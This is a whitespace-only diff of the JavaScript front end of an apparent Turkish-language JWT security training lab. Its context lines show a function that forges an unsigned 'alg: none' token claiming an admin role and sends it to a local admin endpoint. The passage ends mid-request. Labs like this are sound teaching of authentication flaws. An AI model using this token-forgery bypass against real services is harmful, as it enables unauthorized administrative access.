@@ -44,7 +44,7 @@ document.addEventListener('DOMContentLoaded', () => {
             const target = tab.dataset.tab;
             tabs.forEach(t => t.classList.remove('active'));
             tab.classList.add('active');
-            
+
             tabContents.forEach(content => {
                 content.classList.remove('active');
                 if (content.id === target) {
@@ -74,7 +74,7 @@ document.addEventListener('DOMContentLoaded', () => {
     function renderTabContent(tabId) {
         const container = document.getElementById(tabId);
         if (tabId === 'dashboard') return;
-        
+
         if (tabId === 'vulnerable') {
             container.innerHTML = `
                 <div class="lab-card">
@@ -145,7 +145,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     // ─── API İSTEKLERİ (Lokal host üzerinden) ───────────────────────────────────────
-    
+
     // ZAFİYETLİ LAB FONKSİYONLARI
     window.simulateVulnerableLogin = async () => {
         logToTerminal('Vulnerable API\'ye login olunuyor...', 'warning');
@@ -165,18 +165,18 @@ document.addEventListener('DOMContentLoaded', () => {
 
     window.runVulnerableExploit = async () => {
         logToTerminal('☠️ SALDIRI BAŞLATILIYOR: alg:none bypass', 'error');
-        
+
         // MANUEL TOKEN İNŞASI (alg: none exploit)
         const header = btoa(JSON.stringify({ alg: "none", typ: "JWT" })).replace(/=/g, "");
         const payload = btoa(JSON.stringify({ user: "guest", role: "admin" })).replace(/=/g, "");
         const exploitToken = `${header}.${payload}.`;
-        
+
         document.getElementById('vTokenRaw').innerHTML = `
             <span class="token-part-header">${header}</span>.<span class="token-part-payload">${payload}</span>.
         `;
-        
+
         logToTerminal(`Sahte Token Hazırlandı: ${exploitToken}`, 'warning');
-        
+
         try {
             const res = await fetch('http://localhost:3000/admin', {
                 headers: { 'Authorization': `Bearer ${exploitToken}` }
